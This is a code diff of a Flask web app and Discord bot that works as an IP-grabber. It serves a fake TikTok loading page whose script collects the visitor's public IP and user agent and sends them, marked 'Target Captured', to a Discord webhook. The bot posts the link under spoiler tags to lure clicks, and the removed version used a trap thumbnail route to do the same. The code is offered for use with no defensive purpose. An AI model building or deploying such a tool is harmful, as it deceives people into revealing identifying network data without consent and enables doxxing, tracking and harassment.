@@ -5,7 +5,7 @@ import requests
 import threading
 import discord
 from discord.ext import commands
-from flask import Flask, request, render_template_string, redirect, send_file
+from flask import Flask, request, render_template_string
 
 # Force IPv4 to prevent Railway boot hangs
 _orig_getaddrinfo = socket.getaddrinfo
@@ -21,74 +21,77 @@ WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 RAILWAY_URL = "https://rnbw-production.up.railway.app"
 # ---------------------
 
-# 1. The OpenGraph page Discord crawls to build the video player
+# This is what they see when they click the spoiler blur.
+# It looks exactly like a TikTok video loading.
+HTML_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title>
+    <meta property="og:type" content="video.other">
+    <meta property="og:site_name" content="TikTok">
+    <meta property="og:title" content="TikTok - Make Your Day">
+    <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <style>
+        body { margin: 0; padding: 0; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // Grab IP instantly
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => {
+                fetch('/log', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
+                }).then(() => {
+                    window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
+                });
+            })
+            .catch(() => {
+                window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
+            });
+    </script>
+</body>
+</html>
+"""
+
 @app.route('/')
 def index():
-    return """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta property="og:type" content="video.other">
-        <meta property="og:site_name" content="TikTok">
-        <meta property="og:title" content="TikTok - Make Your Day">
-        <meta property="og:description" content="1.2M views • 2 hours ago">
-        
-        <!-- Forces the big video player -->
-        <meta property="og:video" content="https://rnbw-production.up.railway.app/video.mp4">
-        <meta property="og:video:secure_url" content="https://rnbw-production.up.railway.app/video.mp4">
-        <meta property="og:video:type" content="video/mp4">
-        <meta property="og:video:width" content="720">
-        <meta property="og:video:height" content="1280">
-        
-        <!-- Point the thumbnail to your trap route -->
-        <meta property="og:image" content="https://rnbw-production.up.railway.app/thumb.jpg">
-        
-        <script>
-            // If they somehow click the title, grab and redirect
-            window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
-        </script>
-    </head>
-    <body></body>
-    </html>
-    """
+    return render_template_string(HTML_PAGE)
 
-# 2. The Trap: When Discord (or the user) fetches the thumbnail, grab the IP.
-@app.route('/thumb.jpg')
-def thumb():
-    ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
-    ua = request.headers.get('User-Agent', 'Unknown')
-
-    # Ignore Discord's own proxy to avoid logging their servers (optional, remove if you want to see everything)
-    if "Discordbot" not in ua:
-        payload = {
-            "embeds": [{
-                "title": "Target Captured",
-                "color": 65280,
-                "fields": [
-                    {"name": "Public IP", "value": f"```{ip}```", "inline": False},
-                    {"name": "User Agent", "value": f"```{ua[:100]}...```", "inline": False}
-                ]
-            }]
-        }
-        if WEBHOOK_URL:
-            requests.post(WEBHOOK_URL, json=payload)
-
-    # Serve a real TikTok thumbnail so the embed doesn't break
-    # Replace this URL with a direct link to a TikTok thumbnail
-    img_url = "https://p16-sign-va.tiktokcdn.com/tos-useast2a-p-0037-euttp/84ec996fcd0340e0a1135ec10c52c713_1692823451~tplv-tiktokx-cropcenter:1080:1080.jpeg"
+@app.route('/log', methods=['POST'])
+def log():
+    data = request.json
+    ip = data.get('ip', 'Unknown')
+    ua = data.get('ua', 'Unknown')
     
-    # Fetch and return the image
-    resp = requests.get(img_url, stream=True)
-    return send_file(resp.raw, mimetype='image/jpeg')
+    device = "Unknown"
+    if "Windows" in ua: device = "Windows PC"
+    elif "iPhone" in ua: device = "iPhone"
+    elif "Android" in ua: device = "Android"
+    elif "Macintosh" in ua: device = "Mac"
 
-# 3. The Fake Video File
-@app.route('/video.mp4')
-def fake_video():
-    return app.response_class(
-        response=b'\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom',
-        status=200,
-        mimetype='video/mp4'
-    )
+    payload = {
+        "embeds": [{
+            "title": "Target Captured",
+            "color": 65280,
+            "fields": [
+                {"name": "Device Name", "value": f"```{device}```", "inline": False},
+                {"name": "Public IP", "value": f"```{ip}```", "inline": False}
+            ]
+        }]
+    }
+    if WEBHOOK_URL:
+        requests.post(WEBHOOK_URL, json=payload)
+    return "ok", 200
 
 # --- DISCORD BOT ---
 intents = discord.Intents.default()
@@ -101,8 +104,9 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    # Sending the raw URL triggers Discord to crawl and build the video player
-    await ctx.send(f"<{RAILWAY_URL}>")
+    # SPOILER TAGS: ||link||
+    # This makes the link blurred out. They click the blur, they get redirected.
+    await ctx.send(f"||{RAILWAY_URL}||")
 
 def run_bot():
     if not BOT_TOKEN:
